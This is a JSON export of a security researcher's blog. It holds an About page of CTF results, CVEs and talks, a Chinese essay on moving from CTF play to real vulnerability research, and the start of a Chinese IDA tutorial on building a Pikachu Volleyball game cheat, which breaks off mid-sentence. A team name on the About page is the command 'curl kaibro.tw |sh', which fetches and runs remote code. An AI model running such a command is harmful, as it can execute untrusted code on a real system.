{"meta":{"title":"NiNi's den","subtitle":"Hi, I'm NiNi","description":null,"author":"NiNi","url":"http://blog.terrynini.tw","root":"/"},"pages":[{"title":"About","date":"2017-07-22T07:40:16.000Z","updated":"2025-04-01T08:39:19.700Z","comments":true,"path":"about/index.html","permalink":"http://blog.terrynini.tw/about/index.html","excerpt":"","text":"About MeTingYu Chen, aka terrynini38514, major in Cyber Security, member of Balsn, love CTF and everything about computer science. Interests Reverse Engineering Binary Exploitation Fuzzer Development Red Team Cryptography HonorsContest Pwn2Own Toronto 2022, Master of Pwn Dec 9th, 2022 International CTFPlay in Balsn DEFCON 32 CTF Finals, 7th place (if this works we’ll get fewer for next year) Online, Aug. 2024 DEFCON 31 CTF Finals, 3rd place (TWN48) Las Vegas, Aug. 2023 DEFCON 30 CTF Finals, 9th place (&#66;&#x61;&#x6c;&#115;&#110;&#46;&#x32;&#x31;&#55;&#64;&#84;&#x53;&#x4a;&#x2e;&#116;&#119;) Online, Aug. 2022 DEFCON 29 CTF Finals, 5th place (HITCON⚔Balsn) Online, Aug. 2021 DEFCON 28 CTF Finals, 3rd place (HITCON⚔Balsn) Online, Aug. 2020 DEFCON 27 CTF Finals, 2nd place (HITCON⚔BFKinesiS) Las Vegas, USA, Aug. 2019 DEFCON 26 CTF Finals, 12th place (BFS) Las Vegas, USA, Aug. 2018 … Solo Flare-on 8 Finisher #96 (#1 in Taiwan) Online, 2021-11-29 11:21 Flare-on 7 Finisher #177 (#2 in Taiwan) Online, 2020-10-21 10:16 Flare-on 6 Finisher #290 (#8 in Taiwan) Online, 2019-09-27 06:05 Reversing.kr Finisher #26 Online, 2018-08-04 19:58 Play in DoubleSigma DefCamp CTF Finals, 5th place Bucharest, Romania, Nov. 2018 HITCON CTF Finals, 12th place Taipei, Taiwan, Nov. 2017 Domestic CTF AEGIS Finals, 6th place (Virtual Fox) Nangang, Taiwan, Nov. 2020 金盾獎 Finals, 嶄露頭角獎 (ankleboy&amp;banana) Taipei, Taiwan, Nov. 2020 AEGIS Finals, 3rd place (DoubleSigma) Taipei, Taiwan, Sep. 2019 金盾獎 Finals, 1st place (curl kaibro.tw |sh) Taipei, Taiwan, Nov. 2019 AIS3 EOF Finals, 1st place (DoubeSigma) Taipei, Taiwan, Jan. 2019 金盾獎 Finals, 鋒芒畢露獎 (DoubleSigma) Taipei, Taiwan, Oct. 2018 AEGIS Finals, 6th place Taipei, Taiwan, Oct. 2018 AIS3 Finals, 3rd place Taipei, Taiwan, Oct. 2018 AIS3 EOF Finals, 1st place (DoubleSigma_Ethereum) Taipei, Taiwan, Feb. 2018 NTC&#x2F;NCTU&#x2F;NTUST 程式安全 Final CTF, 1st place Online, Dec. 2017 金盾獎 Finals, 潛力無窮獎 (DoubleSigma) Taipei, Taiwan, Dec. 2017 金盾獎 Finalist (AHQ) Taipei, Taiwan, Nov. 2016 PortfolioVulnerability Reports(Global) CVE-2025-2233 - Samsung SmartThings Auth Bypass CVE-2024-48958 - Libarchive OOB Read CVE-2024-48957 - Libarchive OOB Read ClickHouse BugCrowd (2&#x2F;2) - private ClickHouse BugCrowd (1&#x2F;2) - private CVE-2024-38165 - Patch Bypassing of CVE-2024-26185 CVE-2024-26256 - Libarchive Remote Code Execution CVE-2024-26185 - Windows Compressed Folder Tampering CVE-2024-30370 - WinRAR MotW bypass. Orange’s work ,I actually do nothing CVE-2023-32154 - RCE, pre-auth WAN RCE of MikroTik RouterOS CVE-2022-46308 - BAC, able to update&#x2F;remove all users CVE-2022-46307 - BAC, able to control door remotely CVE-2021-3648 (duplicated QQ) - nm-new, CWE-835 Infinite Loop Vulnerability Reports(Taiwan) ZD-2023-00191 - 買動漫，可透過 Line 帳號惡意綁定他人帳號 ZD-2023-00190 - 買動漫 Open Redirect ZD-2022-00909 - 陳寗嚴選購物網站除錯日誌外洩 ZD-2022-00471 - Phison 公司網頁原始碼外洩 ZD-2021-00727 - 陽明交通大學資電亥客與安全碩士學位學程系所首頁原始碼外洩 ZD-2020-00737 - 中央大學學務處大一週會網頁已有後門 ZD-2020-00342 - 中央大學服務學習網 SQL injection Presentation DEVCORE CONF 2025 只需一次 API 呼叫的致命一擊：從硬體逆向到突破保護機制的精準攻擊 Mar. 15, 2025 SITCON 2025 獨自升級的駭客：自由之路從框架開始 Mar. 8, 2025 CCC 38C3 From Convenience to Contagion: The Libarchive Vulnerabilities Lurking in Windows 11 Dec. 30, 2024 HITCON 2024 全境擴散：從 Windows 11 到 libarchive 的深層威脅與全面影響 Aug. 23, 2023 Hexacon 2023: A Comprehensive Review on the Less-Traveled Road: 9 Years of Overlooked MikroTik Pre-Auth RCE Oct. 13, 2023 RomHack 2023: A Comprehensive Review on the Less-Traveled Road: 9 Years of Overlooked MikroTik Pre-Auth RCE Sep. 16, 2023 HITCON 2023: 入無人之徑：於 MikroTik 蟄伏九載的 Pre-Auth RCE Aug. 18, 2023 DEFCON 2023: A Comprehensive Review on the Less-Traveled Road: 9 Years of Overlooked MikroTik Pre-Auth RCE Aug. 11, 2023 AIS3 2023: 挖礦初學指南：從 Fuzzing 到被動收入的輕鬆入門，只剩你不知道 Jul. 26, 2023 AIS3 2023: 沒有 IDA 難道就無法逆向了嗎？IDA豈是如此不便之物！ Jul. 25, 2023 DEVCORE CONF 2023: Remote Door Execution Mar. 11, 2023 AIS3 2019: Firmware security analysis Jul. 30, 2019 ISIP Summer Camp: 逆向工程 Jul. 22, 2020 ISIP Summer Camp: 逆向工程 Jul. 16-17, 2019 ISIP Winter Camp: PWN-別pwn那裡 Dec. 16, 2018 ISIP Winter Camp: 逆向工程-逆逆！忍術！沒有F5之術 Dec. 15, 2018 臺灣好厲駭培訓課程: Attack&amp;Defence 經驗分享 Aug. 25, 2018 ISIP Summer Camp: 逆向工程&#x2F;PWN Jul. 19, 2018 ISIP Summer Camp: 逆向工程 Jul. 18, 2018 ISIP Winter Camp: 從程式 debug+reverse 到 PWN 搶旗大賽 Jan. 31, 2018 Certifications OffSec Exploitation Expert (OSEE) Feb. 2025 - PRESENT Offensive Security Certified Professional (OSCP) Feb. 2021 - PRESENT JLPT N3 Mar. 2021 - PRESENT Educations M. S., Graduate Degree Program of Cyber Security, NYCU Sep. 2019 - Jul. 2021 Bachelor of Science, in Computer Science, NCU Sep. 2015 - Jun. 2019 National Wu-Ling Senior High School Aug. 2012 - Jun. 2015 Experience Security Researcher, DEVCORE May. 2022 - PRESENT Information Technology Intern, Mediatek Jul. 2019 - Aug. 2019 Part-time MIS, Health Center, NCU Jan. 2016 - Jun. 2019 Part-time MIS, Network Systems Division, Computer Center, NCU Jan. 2016 - Jun. 2017 Contributions radareorg&#x2F;radare2 - Fix zignature mask from `zj` is differ from `z` (#17180) AFLplusplus&#x2F;AFLplusplus - remove redundant unsetenv (#947)"},{"title":"Categories","date":"2017-07-22T07:40:16.000Z","updated":"2017-11-07T08:07:05.000Z","comments":true,"path":"categories/index.html","permalink":"http://blog.terrynini.tw/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2017-07-22T07:21:34.000Z","updated":"2017-07-22T08:36:13.000Z","comments":true,"path":"tags/index.html","permalink":"http://blog.terrynini.tw/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2024::CTF轉生—不轉生就拿出真本事","slug":"2024-CTF轉生—不轉生就拿出真本事","date":"2024-11-16T19:03:11.000Z","updated":"2024-11-17T10:22:17.760Z","comments":true,"path":"tw/2024-CTF轉生—不轉生就拿出真本事/","permalink":"http://blog.terrynini.tw/tw/2024-CTF%E8%BD%89%E7%94%9F%E2%80%94%E4%B8%8D%E8%BD%89%E7%94%9F%E5%B0%B1%E6%8B%BF%E5%87%BA%E7%9C%9F%E6%9C%AC%E4%BA%8B/","excerpt":"這次受邀在 HITCON 的社群活動「HITCON CTF 揭秘」演講，主題是「CTF 轉生－到了業界就拿出真本事」。但我偶爾還是有打打 CTF，算是「不轉生就拿出真本事」。做簡報的時候，腦袋裡面就有一堆東西飛來飛去，因此決定寫成一篇文章。 咱們就不花時間介紹 CTF 是什麼了，ddaa 寫的「CTF 的三十道陰影」是最完整的系列文，除了 CTF 的介紹之外還包含了很多趣聞，非常推薦一天看一篇增廣見聞。","text":"這次受邀在 HITCON 的社群活動「HITCON CTF 揭秘」演講，主題是「CTF 轉生－到了業界就拿出真本事」。但我偶爾還是有打打 CTF，算是「不轉生就拿出真本事」。做簡報的時候，腦袋裡面就有一堆東西飛來飛去，因此決定寫成一篇文章。 咱們就不花時間介紹 CTF 是什麼了，ddaa 寫的「CTF 的三十道陰影」是最完整的系列文，除了 CTF 的介紹之外還包含了很多趣聞，非常推薦一天看一篇增廣見聞。 前言、碎唸、暴言打 CTF 有什麼好處？ 對於資訊安全感興趣的人，相信多半都參加過一兩場 CTF，也對這類活動抱有相當複雜的情感。在學習資安相關知識與技術的過程中，CTF 是一個高效且具引導性的手段。雖然它不是解決所有問題的靈丹妙藥，但在成長的初期階段，CTF 題目就像課本的習題，解題的過程一定能帶來收穫，對於剛起步的初學者來說，是一個由淺入深的學習方法。 然而，當我們想向他人推薦 CTF 或說服他人參與時，如果只是用「打 CTF 對身體好」或「打 CTF 會變聰明」這類模糊的論點，是很難令人信服的。這種說法與那些「以戰代訓對身體好」、「以戰代訓會變聰明」、「多讀簡報對身體好」或「多讀簡報會變聰明」的論述本質上沒有區別，僅僅是碰巧在對的時間點、對的情境下，給人一種正確的印象，但這並不代表提出這種說法的人真正了解它的價值。 這類論述的最大缺陷在於，宣稱的「好處」究竟是如何具體體現的？如何獲得這些好處？每個人的學習狀況與知識基礎都不同，如果不能清晰地說明具體的利弊，那這些說法往往只會流於空談和自我滿足。 一直以來也不乏有「CTF 無用」的質疑，導致一些剛起步的人無所適從，可能繞了遠路、做出低效的學習選擇，甚至只停留在某些固定的技能範疇，永遠只會那一千零一招。「CTF 無用」的背後，或許包含了像「這不實用」或「獎金太少，不如去刷 bounty」這類想法。我們需要明確地了解 CTF 能帶來的效益。當清楚這些效益後，如果認為自己已經具備相關能力，或者有更高效的方式達成目標，那麼 CTF 當然不必成為唯一的選擇。 除此之外，在台灣，如果曾參加像 DEFCON 決賽這樣的大型比賽，通常會在演講、授課、出題或升學等方面獲得更高的評價、酬勞與機會。也因此，近來有些 CTF 選手試圖以各種形式加入已晉級 DEFCON 決賽的隊伍，藉此提升自己的價值。然而，比賽的成績終究只是暫時的，與其過度追求短期的榮譽，不如專注於精進自己的實力，這才是健康且長遠的策略。 請大家自己對號入座 當然，參加 CTF 的理由並不僅僅是為了這些「好處」。有時候，CTF 選手只是單純地追求快樂：解題的過程很爽、與朋友一起合作很爽、進入決賽很爽、甚至奪冠更是無與倫比的爽感。（目前還沒有台灣的隊伍在 DEFCON 決賽奪冠QQ） 這次演講的下半場主題，正是邀請研究員分享他們在業界發展中，CTF 為其帶來的助益與啟發。 思考暖身操一開始我本來想說這個主題其實沒啥好講的，一個簡單的實驗就可以結束了(X) 1. 在心中想一到三個符合標準的出色漏洞研究員 為了減少「權威效應」帶來的影響，我設下一個小限制：必須具體回想起這個人實際做過的事情。例如，有些人在我心中總有個模糊的印象，覺得「他好像很懂 Windows」或「他好像很擅長滲透測試」，但當你仔細回想時，卻無法說出他到底做過什麼。後來，我把這些人看作資安圈的網紅，他們的價值大多來自於講述別人的故事以換取流量，或是透過排山倒海的專有名詞混淆聽眾來建立權威形象。說白一點，他們只是些不求甚解、散佈錯誤知識、賣弄Buzzword 的打字機罷了。 2. 請問他是一個好的 CTF 選手嗎？ 目前我觀察到，近幾年的 Hacker 多數是透過 CTF 這種途徑學習成長的，當然其中也有例外，但這是比例問題。從我的體感來看，CTF 已經是資安學習中一種最有跡可循、強度足夠且成果相對可預期的方法了。 CTF 與現實世界的差異如前所述，在學習資安相關的知識與技術時，CTF 是一個高效又極具引導性質的手段。CTF 的設計將現實世界中漏洞挖掘過程中的許多雜訊盡可能地排除，使選手能專注於解決核心問題，相較於其他學習方式，CTF 可以快速學習並掌握關鍵技能。 接下來，我們可以通過比較 CTF 的比賽流程與現實世界的漏洞挖掘流程，來分析 CTF 能為我們帶來哪些具體的幫助。在一場 CTF 比賽中，選手針對每道題目挖掘漏洞的過程大致如下： --- title: CTF 的漏洞挖掘 --- flowchart LR classDef default fill:white,stroke:white,stroke-width:2px,font-size:14px,font-family:sans-serif,color:#0b3a49; subgraph 分析被大幅簡化 枚舉攻擊面-->分析-->枚舉攻擊面 end 分析-->find[\"找到漏洞（可能是非預期解）\"]-->exp[\"寫 exploit\"]-->flag[\"提交 flag\"] 而在現實世界中，研究員發現資安漏洞的流程大概會是這樣： --- title: 現實世界中挖掘漏洞的流程 --- flowchart LR classDef default fill:white,stroke:white,stroke-width:2px,font-size:14px,font-family:sans-serif,color:#0b3a49; subgraph 大量的分析 class 大量的分析 highlight; 枚舉攻擊面-->分析-->枚舉攻擊面 end class 枚舉攻擊面,分析 highlight; 分析--如果真的有漏洞-->find[\"找到漏洞\"] find-->exp[\"寫 exploit\"] find-->poc[\"寫 PoC\"] class find important; class exp important; exp-->回報漏洞 poc-->expand exp-->expand[\"擴大影響範圍\"] poc-->回報漏洞 expand-->回報漏洞 差異之一： Exploit 的必要性、完整性、穩定性在現實中，對 Exploit 的必要性及完整性要求差異較大。如果目的是向廠商回報漏洞並促使修復，通常只需要提供概念驗證（Proof of Concept, PoC），而不必提供完整的 Exploit。PoC 的目的是證明某個行為能夠觸發程式執行預期外的操作，例如： 意外的輸出：如訪問未經授權的資料 程式 Crash：例如因 Buffer Overflow 導致的 Segmentation Fault 不符合邏輯的動作：如繞過驗證或權限檢查。 執行任意指令：例如 Command Injection 導致的行為改變。 但在 CTF 比賽中，通常會要求選手從頭到尾完成漏洞挖掘與利用，並撰寫一個能夠獲得「Flag」的 Exploit。因此，CTF 中的 Exploit 對完整性的要求通常高於某些現實場景，且要求較為一致。因此大部分的 CTF 選手對於現實世界的漏洞利用都會上手的較快，尤其在面對較難利用的漏洞時，他們能憑藉比賽中累積的經驗，更容易撰寫出可行的 Exploit。 不過，在一些較為嚴苛的現實場景中，例如軍事行動、執法行動、紅隊演練或收購 Exploit 的比賽（如 Pwn2Own、kernelCTF 等），除了需要一個完整的 Exploit，Exploit 還必須具備高水準的穩定性。以紅隊演練為例，如果一個 Exploit 有可能導致目標主機當機、丟失資料或下線等影響正常營運的情況，那麼這個 Exploit 就不可能被採用。 差異之二：分析階段的難度、擴大影響範圍的想像力回顧一下剛才繪製的流程圖，現實世界與 CTF 還存在幾個不同點： --- title: 現實世界中挖掘漏洞的流程 --- flowchart LR classDef default fill:white,stroke:white,stroke-width:2px,font-size:14px,font-family:sans-serif,color:#0b3a49; subgraph p1[較 CTF 複雜] subgraph 大量的分析 class 大量的分析 highlight; 枚舉攻擊面-->分析-->枚舉攻擊面 end end class 枚舉攻擊面,分析 highlight; 分析--如果真的有漏洞-->find[\"找到漏洞\"] find-->exp[\"寫 exploit\"] find-->poc[\"寫 PoC\"] class find important; class exp important; subgraph p2[選手較無經驗] 回報漏洞 expand end exp-->回報漏洞 poc-->expand exp-->expand[\"擴大影響範圍\"] poc-->回報漏洞 expand-->回報漏洞 class p1 redBorder; class p2 redBorder; %% 定義紅框的樣式 classDef redBorder stroke:#ff0000,stroke-width:2px,fill:transparent; 首先，CTF 比賽的時間通常較短，大多為 24 到 72 小時。在這樣緊湊的時間限制下，出題方會更加專注於題目的核心概念，並不要求選手進行過多的分析。因此，當選手轉向在現實產品中挖掘漏洞時，往往會因為資料收集不完整或分析不夠深入，而錯過一些較為簡單的漏洞。 其次，CTF 比賽中的漏洞是由出題方設計的，選手只需提交 flag 就能證明漏洞的存在並完成利用。而在現實中，研究員通常需要撰寫簡單易讀的報告，完整地描述漏洞的根源、漏洞可能造成的危害、受影響的產品及版本號，並且提供重現漏洞所需的實驗環境設置，供廠商確認、評估和修復。 最後，有時候研究員發現的只是微小的瑕疵，但憑藉對計算機科學和軟體架構的深入理解，熟練的研究員往往能將多個看似不足為患的漏洞串聯起來，在現實中撕出一個巨大的缺口。 差異之三：到底有沒有漏洞？或許有人已經注意到流程圖中標註的「如果真的有漏洞」這一部分。CTF 將一個概念簡化並進行包裝，選手較不會在一堆的攻擊面（Attack Surface）當中迷失自我。而且，由於選手可以「確信漏洞確實存在」，他們能夠專注於解決問題和學習題目所要傳達的核心概念。 「確信漏洞確實存在」聽起來好像沒有什麼，但無論是在 CTF 競賽中還是真實世界的漏洞挖掘過程中，當體力、精神和專注力都接近枯竭時，一個信念就能改帶來重大影響。當研究員在面對真實目標時，必須依靠知識和長期培養的直覺，堅信「這裡一定有漏洞」。（angelboy 每次都說這肯定有洞阿） 差異之四：現實世界的狗屎爛蛋當然，現實世界可不是只有這一點噪音跟雜訊。實際上，研究員除了解決存在於電腦世界的難題之外，還必須解決與人之間的難題： 甚至結束也不是結束，後續還有各種 Happy Ending 跟 Bad Ending 等你解鎖，包括但不限於：有錢有 credit、有錢沒 credit、沒錢有 credit、沒錢沒 credit、廠商說這不是洞然後 silent fix 等等。 CTF 帶來的幫助硬技能 豐富的⼯具使⽤經驗：IDA、Burp Suite、Frida、流量分析工具…… 好的選手不僅會用工具，還會修工具，甚至自己擴展功能 紮實的知識：Exploit 能打成功，觀念不可能偏差的太遠 CTF 鮮少有模糊空間，選手沒有辦法宣稱自己知道怎麼攻擊就拿到 flag 獲得分數，選手必須真真切切的從頭到尾不出錯的完成整個攻擊。這也強迫選手必須深入理解很多概念，這就像是看完課本之後很多人就覺得自己懂了某個概念，等到要考試時才發現原來自己漏東漏西。 敏銳的直覺：知道哪裡更容易出現漏洞，更容易做出 Educated Guess（通靈） ⼈際網路「研究是孤獨的」，確實，但，「在研究的當下」才是孤獨的，如果真的搞到平常一個朋友都沒有，那是真的挺可悲的。大部分人參加 CTF 比賽都不是一個人，參賽隊伍經常合併、挖角，在決賽或是實體參加的比賽現場也很容易認識外國的選手，除了單純認識之外還有可能產生更多的合作機會，例如，為了選出參加歐盟主辦的 ICC 國際賽事的亞洲區代表選手，亞洲區會員國是透過和 CTF 選手協力籌辦的 ACSC 賽事進行篩選。如果 CTF 選手經常參加各類國際比賽並且表現不錯，就有可能被邀請加入籌備團隊。 如前所述「CTF 鮮少有模糊空間，選手沒有辦法宣稱自己知道怎麼攻擊目標就拿到 flag 獲得分數，選手必須真真切切的從頭到尾不出錯的完整整個攻擊」，所以在 CTF 競賽中累積的成果是很容易被認可的。不論是在找實習或是就業上都有加分的效果。 軟技能 資訊安全的趨勢：新的題⽬很常反映出現實的研究動態 由於每年都有一堆比賽，通常是由世界各地的選手或是研究員舉辦，很容易就可以接觸到舒適圈以外的技術或是議題。 快速學習： CTF 比賽時間通常是 24 到 72 小時不等，在有限時間內接觸到的新概念很多，快速學習的能力就會漸漸的被培養起來。 合作精神： 為了在比賽中獲勝，團隊的效率是很重要的。好的選手會避免與隊友做重複的事情，這也表示選手會慢慢熟悉如何將一個複雜的任務分解成若干個小任務。 時間管理： 比賽的人力總是不足，多解出一題，名次可能就天差地遠。選手會學著去設下停損點，轉換研究⽅向 ，避免鑽牛角尖。 反思能力：誠實⾯對⾃⼰跟團隊的缺失、決策錯誤 CTF 選手通常有較高的勝負欲，每次賽後檢討都是非常的直接，久而久之，選手更能誠實⾯對⾃⼰跟團隊的不足之處。 如何從 CTF 銜接到實戰？那 CTF 選手應該怎麼做才能較好的銜接到實戰呢？我們知道 CTF 選手的優勢： 長期累積的知識 對於攻擊流程的熟悉度 時間管理與止損點控制 而選手轉換到實戰時，遇到的挑戰是相對簡單的： 盡可能完整的枚舉攻擊⾯： 正確的分類攻擊⾯，每個功能具體對應到程式中的什麼部分。 有效率的分析： 沒有辦法把一個⽬標 100% 完整看完。需要直接切入到靠近重點的部份。 撰寫穩定的 Exploit： 某些情況要求 Exploit 穩定、不可讓⽬標 crash，穩定性夠⾼才有辦法投入實戰。 簡單可執行的方法是： 事前做好研究 過往的 CVE 以及別⼈研究的⽅法是什麼？還有機會嗎？遺漏的攻擊⾯？ 事中做好筆記 在找什麼？怎麼找到這裡的？什麼東⻄分析過了？攻擊不可行的具體原因是什麼？ 事後做好整理 ⼀個⽬標不會只看⼀次，每次累積的經驗都是未來的優勢 例子假設在研究一個 IoT 設備，為求簡化，我們假設它總共只有三個攻擊面：Web 介⾯、防火牆、處理通訊協議的 binary。圖中綠色的部份是 CP 值較高，應該優先檢查的項目；紅色部份則是 CP 值較低，耗費時間成本或難度較高的目標。 顯然，那些難度較大的項目，是個正常人都會知道自己看錯東西了，誰打個 IoT 設備會先從 iptables 開始看呢？但當難度跨距沒這麼大時，人就會往自己擅長的方向瘋狂的鑽進去。假設研究員沒有完整的枚舉攻擊面，而是在自己擅長的領域往死裡鑽，那他很有可能花了一兩個月在找某個開源 json 套件的 0day（而且最後還沒找到）。而來自世界另一端的研究員早在第一天就發現防火牆少設了一條規則，只要敲個預設密碼就可以登入主機。 當然，更常見的情況是，選手轉換到現實的研究時，常被自己在 CTF 團隊中的定位限制了思路。例如他是個 Pwner，就瘋狂往 binary 打，卻沒看到 Ｗeb 介面有一個金鑰固定的 JWT 可以被利用來直接登入 admin；是個 Web 選手，就瘋狂往 web 打，卻沒看到 binary 裡面有赤裸裸的 Command Injection。 練習：重現他人發現的 1-dayCTF 的優點在於具體的題目範圍、知道絕對有漏洞存在，以及有 write-up 可以供學習參考。因此，我們可以將這些優點應用於現實世界的漏洞挖掘，為自己創造源源不絕的練習題材。具體來說，可以嘗試復現 1-day 漏洞，並在過程中挑戰以最少的資訊完成復現（通常是只看 CVE 的 advisory，卡住再參考他人的分析文章）。 為了確保「有 writeup 可以看」，建議選擇較熱門的目標，例如作業系統、瀏覽器或 IoT 設備等。同時，選定的 1-day 漏洞不可過於簡單，復現過程中至少應有一個階段具挑戰性。僅復現一個沒有難度的漏洞，例如只須輕鬆逆向就能發現的簡單 stack overflow，練習效果會有限。但如果漏洞本身簡單，分析過程卻非常困難（如軟體架構複雜或涉及硬體相關技能等），則能達到更好的效果。 結語其實演講之後寫這篇文章也不是想傳遞什麼理念或是價值，只是想偷偷塞一點自己的暴言。最後要講清楚一件事情，這裡說的是「CTF 帶來的好處」，不是「只打 CTF 帶來的好處」，CTF 選手也可以會讀論文、會寫論文、會跟最新的 Conference、會做硬體攻擊，都很讚，都做。雖然大家平常搞的都是二進制，但如果連現實世界都要二分法的話那就不酷了喔。","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"}]},{"title":"2024::從皮卡丘打排球學習逆向工程","slug":"2024-從皮卡丘打排球學習逆向工程","date":"2024-09-21T15:59:43.000Z","updated":"2024-11-16T15:47:03.085Z","comments":true,"path":"tw/2024-從皮卡丘打排球學習逆向工程/","permalink":"http://blog.terrynini.tw/tw/2024-%E5%BE%9E%E7%9A%AE%E5%8D%A1%E4%B8%98%E6%89%93%E6%8E%92%E7%90%83%E5%AD%B8%E7%BF%92%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/","excerpt":"去年在 AIS3 的軟體安全選修講了一門關於逆向工程的課《沒有 IDA 難道就無法逆向了嗎？IDA豈是如此不便之物！》。課堂中有一個現場的實作，是我帶著學生撰寫皮卡丘打排球的外掛程式，這是很久以前（2018?）旁聽交大的程式安全時，Lays 在課堂上展示的一個範例（講了整體概念，沒有時間帶到細節），那時候就覺得太酷了吧，我也來試試。所以這次也選擇讓它變成課程的一部分，讓 AIS3 的學生可以在獲得成就感的情境下熟悉 IDA 的操作，並知道如何透過對程式的理解來加速逆向的過程。","text":"去年在 AIS3 的軟體安全選修講了一門關於逆向工程的課《沒有 IDA 難道就無法逆向了嗎？IDA豈是如此不便之物！》。課堂中有一個現場的實作，是我帶著學生撰寫皮卡丘打排球的外掛程式，這是很久以前（2018?）旁聽交大的程式安全時，Lays 在課堂上展示的一個範例（講了整體概念，沒有時間帶到細節），那時候就覺得太酷了吧，我也來試試。所以這次也選擇讓它變成課程的一部分，讓 AIS3 的學生可以在獲得成就感的情境下熟悉 IDA 的操作，並知道如何透過對程式的理解來加速逆向的過程。 如果你是來看熱鬧的可以直接跳到 放置型皮卡丘打排球 看最終成果；如果你想直接看外掛程式的部份，可以直接跳到 注入王之力！。 你是誰？你在哪？你要幹嘛？本次逆向的目的是「還原皮卡丘打排球遊戲中的資料結構，透過操作記憶體進一步做出製作遊戲外掛」。最後實現的外掛功能有： 把兩個皮卡丘都改成電腦操作，讓電腦左右互搏！ 用滑鼠操作排球（可以用 cheat engine 做到，但本次練習目的是讓學員熟悉分析時的思考方式） 首先我們先列舉皮卡丘打排球這個程式有什麼特徵： 他是 GUI 程式 玩家透過鍵盤操作皮卡丘進行遊戲 根據上述兩個資訊，我們可以加快逆向工程所需要的時間！ 皮卡！啟動！首先將 pikaball.exe 放入 IDA 中進行分析，那怎麼開始分析呢？平時我們透過字串或是 API 來定位我們想分析的邏輯。然而與操作皮卡丘相關的邏輯應該是不會包含字串，因此我們從 「玩家透過鍵盤操作皮卡丘進行遊戲」這個事實切入。 在 IDA 中打開「Import」的分頁，搜尋「key」或是「keyboard」就可以發現皮卡丘打排球有使用鍵盤相關的 API 來獲得鍵盤狀態（這裡靠晶彥，或你要說瞎猜。有知識靠知識，沒知識靠通靈！）： 點擊名稱兩下，IDA 會帶我們 .idata 段，這裡是 PE 檔案格式用來存放外部 function 的一個地方： 在 GetKeyboardState 上面按快捷鍵 X，或是右鍵 -&gt;「list cross reference to」來找到程式中有引用這個 function 的地方，我們會看到僅有一個 function 有使用到 GetKeyboardState： 點 GetKeyboardState 兩下跟隨後，按下 F5 進行反編譯，便可以約略猜出這個 function 的功能應該是： 呼叫 GetKeyboardState 獲得鍵盤狀態 將表示鍵盤狀態的陣列透過 bit or 壓縮成一個變數 v3 此時我會將 function 重新命名來節省記憶力，現在的函數名稱是「sub_409370」，意思是「位於程式記憶體位置 0x409370 的一個 subroutine」。在 sub_409370 名稱上面按快捷鍵 N，或是右鍵 -&gt;「rename global item」來重新命名。這裡有個命名的小技巧：保留記憶體位置。除了方便定位之外，撞名時也不用想新名字。所以我們把它命名成「GetKeyboard_40937」： 接下來在新的 function 名稱 GetKeyboard_40937 上面按快捷鍵 X，或是右鍵 -&gt;「list cross reference to」來找到程式中有引用這個 function 的地方，我們會看到僅有sub_406F60 一個 function 有使用它： 點擊兩下跟隨後會看到一個操作略微難懂的 function sub_406F60，此時還看不太懂。我們可以轉而看一下 sub_406F60 呼叫的第一個 function sub_4092D0 在做什麼： 在 sub_4092D0 中有個 API「joyGetPosEx」，通過名字應該很好猜到這是一個用來獲得遊戲手把（joystick）的狀態的 API。如果猜不到的話可以 google 到微軟手冊中的說明 joyGetPosEx 所以我們可以先猜測這個略微難懂的 function sub_406F60 應該是獲得遊戲角色最新的操作，這裡將它叫做 GetControlCode_406F60 我們一樣在 GetControlCode_406F60 上面按 X，一樣只找到 sub_401460 一個 function 引用： 這裡可以透過一些經驗法則來猜測， v4[0]、v4[1] 其實是在記錄方向鍵是否有被按下，v4[2]、v4[3] 是另外兩個按鍵，可能是殺球的指令。此時，為了方便我們逆向，我們可以先建立一個資料結構。我們透過手動計算，因為 v4 是個 _DWORD * ，所以按照記憶體被存取的方法，這可能是一個包含了四個 int 的 struct，我們姑且先定義它為 struct control： struct control&#123; int x; int y; int key; int another_key;&#125;//所以 v4 實際上可以從 _DWORD * 被更精準的定義成下面這個樣子struct control* v4; 但是當資料結構一大的時候，逐一計算會很費時間。所以我們可以使用 IDA 的功能來快速定義 struct。首先在 v4 上面按右鍵，選擇「reset pointer type」 會看到 v4 不再是指標 接下來再對 v4 按一次右鍵，選擇「Create new struct type」 IDA 就會根據這個 v4 被存取的樣式來分析出記憶體的布局方式： 因為稍後我們會建立很多資料結構，所以這裡有個小技巧是，每個你創建的 structure 前面可以加上你愛用的前綴，這樣我們之後就會知道這是我們分析過後建立的資料結構（IDA 自己會引入一些資料結構，我們可能會混在一起） 按下 ok 後即可 此時不要忘記我們本來的目的，我們要做的事情是，基於「鍵盤輸入會影響皮卡丘物件」的這個事實，透過追蹤鍵盤操作的執行流程與資料流定位到皮卡丘物件。所以我們要找的是 v4 接下來去哪，但我們馬上就會發現他並沒有被使用，原因是 v4 這個「指標」也是從別的地方借來的（看第 15 行） 看到第 15 行，看得出來 v4 是從 this 這個物件取出的，所以我們先針對 this 重複剛剛的操作來重建 struct：「reset pointer type」-&gt;「create new structure」。因為這次沒辦法馬上猜出這個 structure 的意義，所以我們姑且就使用 IDA 給我們的名字，但是加上前綴跟使用他的 function 的位置來命名方便之後找到他。 此時注意 v4 這行，會發現型別沒有對上，所以我們接著打開「local type」的介面對 structure 進行調整，或是通過以下方法慢慢調整結構也可以的，首先我們先調整 this-&gt;char30 的型別 在 char30 上面按快捷鍵 Y 或是右鍵「set field type」，他實際上是一個 nini_control 的 array，而且有兩個元素 為什麼是兩個元素呢？這件事情可以通過下面的迴圈回推得到，注意迴圈裡有個 ++v4，而 2 這個數字跟「兩隻」皮卡丘不謀而合，所以我們可以假設，只要看到有個 while 跑了兩次，很大機率是在處理跟兩隻皮卡丘有關係的邏輯。 當然為了方便辨識，我們也可以幫 char30 重新命名，在 char30 上面按 N 或是右鍵 rename field，重新命名為 controls 按下 f5 重新 decompile，像 v4 這種預設的名稱，會因為看到我們重新命名了 structure 中的的變數名稱，如 controls，將新名稱傳遞給 v4，所以 v4 也會被叫成一樣的名字方便閱讀： 好，此時往下滑應該可以看到我們的 controls 有被拿來使用 我們進入 sub_404E30 ，會發現外層看起來只顯示一個參數，但是點進來後卻變成兩個參數： 這是因為 IDA 在我們進入 function 時分析了一次。我們回到外層就會發現外層也被同步更新了。這裡按 Esc 